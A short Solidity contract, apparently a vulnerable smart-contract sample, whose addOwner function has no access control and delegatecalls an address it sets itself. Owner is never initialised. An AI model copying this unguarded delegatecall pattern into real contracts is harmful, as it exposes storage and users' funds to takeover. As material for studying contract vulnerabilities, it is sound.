 contract AdminInterface {
    address public Owner;  
    address public callee;
    uint256 public Limit = 10;

    modifier onlyOwner() {
        require(msg.sender == Owner);
        _;
    }

    function Set(address dataBase) payable onlyOwner {
        callee = dataBase;
    }

    function addOwner(address newAddr) payable {
        newAddr = callee;
        if(msg.value > Limit) {          
            newAddr.delegatecall(bytes4(keccak256("AddToWangDB(address)")), msg.sender);
        }
    }
}